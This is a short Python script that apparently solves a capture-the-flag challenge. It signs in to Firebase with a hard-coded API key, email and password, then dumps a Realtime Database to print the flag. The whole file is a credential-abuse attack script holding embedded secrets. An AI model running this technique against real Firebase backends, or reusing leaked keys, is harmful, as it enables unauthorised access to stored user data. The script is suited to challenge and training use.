import requests

API_KEY = "AIzaSyAXsK0qsx4RuLSA9C8IPSWd0eQ67HVHuJY"
EMAIL = "TK757567@pwnsec.xyz"
PASSWORD = "C7_dotpsC7t7f_._In_i.IdttpaofoaIIdIdnndIfC"

DATABASE_URL = "https://firestorm-9d3db-default-rtdb.firebaseio.com"

auth_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"

payload = {
    "email": EMAIL,
    "password": PASSWORD,
    "returnSecureToken": True
}

print("[*] Authentification Firebase en cours...")

auth_response = requests.post(auth_url, json=payload)
auth_response.raise_for_status()

auth_data = auth_response.json()
id_token = auth_data["idToken"]

print("[+] Connexion Firebase réussie.")
print("[+] Token obtenu.")

print("[*] Lecture de la Realtime Database...")

db_url = f"{DATABASE_URL}/.json?auth={id_token}"
db_response = requests.get(db_url)
db_response.raise_for_status()

print("\n[+] FLAG récupéré :")
print(db_response.json())